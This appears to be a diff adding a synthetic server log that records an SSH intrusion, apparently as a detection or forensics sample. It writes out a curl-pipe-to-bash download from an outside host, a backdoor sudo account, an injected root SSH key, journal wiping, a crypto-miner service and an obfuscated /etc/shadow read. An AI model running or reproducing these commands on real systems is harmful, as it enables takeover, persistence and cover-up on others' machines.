@@ -1,0 +1,21 @@
+Jul 30 05:29:58 sentinel CRON[3980]: (root) CMD (/usr/bin/certbot renew --quiet)
+Jul 30 05:29:59 sentinel sshd[3990]: Connection closed by 198.51.100.7 port 44120 [preauth]
+Jul 30 05:30:01 sentinel kernel: [UFW BLOCK] IN=eth0 OUT= MAC=aa:bb:cc:dd:ee:ff:11:22:33:44:55:66:08:00 SRC=203.0.113.45 DST=192.168.1.42 LEN=60 TOS=0x00 PREC=0x00 TTL=52 ID=54321 PROTO=TCP SPT=51000 DPT=23 WINDOW=1024 RES=0x00 SYN URGP=0
+Jul 30 05:30:03 sentinel sshd[4001]: Failed password for invalid user admin from 203.0.113.45 port 51001 ssh2
+Jul 30 05:30:05 sentinel sshd[4002]: Failed password for invalid user oracle from 203.0.113.45 port 51002 ssh2
+Jul 30 05:30:07 sentinel sshd[4003]: Failed password for invalid user test from 203.0.113.45 port 51003 ssh2
+Jul 30 05:30:09 sentinel sshd[4004]: Failed password for root from 203.0.113.45 port 51004 ssh2
+Jul 30 05:30:11 sentinel sshd[4005]: Failed password for arron from 203.0.113.45 port 51005 ssh2
+Jul 30 05:30:13 sentinel sshd[4006]: Accepted password for arron from 203.0.113.45 port 51006 ssh2
+Jul 30 05:30:13 sentinel sshd[4006]: pam_unix(sshd:session): session opened for user arron by (uid=0)
+Jul 30 05:30:31 sentinel sudo[4100]: arron : TTY=pts/0 ; PWD=/home/arron ; USER=root ; COMMAND=/bin/bash
+Jul 30 05:30:47 sentinel bash[4131]: arron : COMMAND=curl -s http://198.51.100.99/x.sh | bash
+Jul 30 05:31:05 sentinel useradd[4211]: new user: name=svc-backup, UID=1002, GID=1002, home=/home/svc-backup, shell=/bin/bash
+Jul 30 05:31:06 sentinel usermod[4212]: add 'svc-backup' to group 'sudo'
+Jul 30 05:31:20 sentinel sshd[4230]: Accepted publickey for svc-backup from 203.0.113.45 port 51200 ssh2: ED25519 SHA256:8xQnP2vLmR4tKjW6yFbHc3ZaEdGu9NsQ1oXpTvBrYlM
+Jul 30 05:31:44 sentinel bash[4260]: svc-backup : COMMAND=echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJx' >> /root/.ssh/authorized_keys
+Jul 30 05:32:10 sentinel bash[4291]: svc-backup : COMMAND=journalctl --vacuum-time=1s
+Jul 30 05:32:31 sentinel systemd[1]: Started xmrig-proxy.service.
+Jul 30 05:33:02 sentinel sudo[4350]: svc-backup : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/cat /etc/‮wodahs‬
+Jul 30 05:33:40 sentinel sshd[4380]: Failed password for root from 192.168.1.77 port 41022 ssh2
+Jul 30 05:34:01 sentinel systemd[1]: Started Daily apt download activities.
